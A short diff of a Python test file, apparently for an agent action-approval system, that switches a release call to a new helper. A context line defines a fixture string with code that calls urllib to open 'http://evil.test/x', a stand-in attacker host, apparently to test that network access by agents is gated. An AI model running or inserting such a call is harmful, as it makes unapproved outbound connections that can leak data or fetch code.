@@ -7,6 +7,7 @@ import time
 
 from app.flow.wq import wq
 from tests.test_0224_critique import Agent
+from tests import viewkit  # noqa: E402  (r0352: decisions name the view)
 
 NET = "import urllib.request as u; u.urlopen('http://evil.test/x')"
 WR = "ESCALATE_WRITTEN_RUN"
@@ -23,7 +24,7 @@ def _agent(client, owner, tmp_path, name, n_files):
 
 def _release(a, rid):
     sha = a.c.get("/api/approvals/" + rid).json()["action"]["args_sha256"]
-    r = a.o.post("/api/approvals/%s/release" % rid, release=True, envelope_b64=a.o.sign(wq.TYP_RELEASE, wq.release_payload(rid, sha, True)))
+    r = viewkit.release(a.o, rid, sha, True)
     assert r.status_code == 200, r.text
 
 
